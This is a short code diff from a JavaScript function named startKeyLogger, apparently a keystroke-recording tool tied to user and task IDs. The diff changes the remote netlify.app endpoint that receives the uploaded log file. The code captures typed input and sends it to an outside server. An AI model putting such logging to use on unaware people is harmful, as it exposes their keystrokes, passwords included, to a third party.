@@ -55,7 +55,7 @@ function startKeyLogger(user_id_str, platform_initial, task_id) {
     formData.append("file", blob, filename); // filename → Content‑Disposition
 
     try {
-      const res = await fetch("https://melodious-squirrel-b0930c.netlify.app/saver", {
+      const res = await fetch("https://melodious-squirrel-b0930c.netlify.app/.netlify/functions/saver", {
         method: "POST",
         body: formData, // fetch sets the correct multipart boundary
       });
